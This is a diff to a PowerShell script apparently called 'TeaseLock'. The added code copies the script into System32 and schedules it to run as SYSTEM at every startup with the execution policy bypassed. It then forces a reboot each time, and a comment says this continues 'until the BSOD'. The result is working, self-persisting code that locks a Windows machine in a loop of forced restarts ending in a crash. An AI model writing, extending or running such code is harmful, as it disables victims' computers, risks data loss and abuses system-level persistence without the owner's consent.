@@ -48,6 +48,15 @@ elseif ($restartCount -eq 2) {
 # SAVE RESTART COUNT
 Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force
 
-# FORCE RESTART (Without PowerShell GUI)
-schtasks /create /tn "ForceRestartTease" /tr "shutdown /r /f /t 5" /sc onstart /ru SYSTEM /f
+# ENSURE SCRIPT RUNS AFTER REBOOT
+$scriptPath = "C:\Windows\System32\TeaseLock.ps1"
+$taskName = "TeaseLockAutoRun"
+
+# Copy script to a safe location
+Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
+
+# Schedule the script to run at **every startup** until the BSOD
+schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f
+
+# FORCE RESTART (No PowerShell GUI)
 shutdown /r /f /t 5
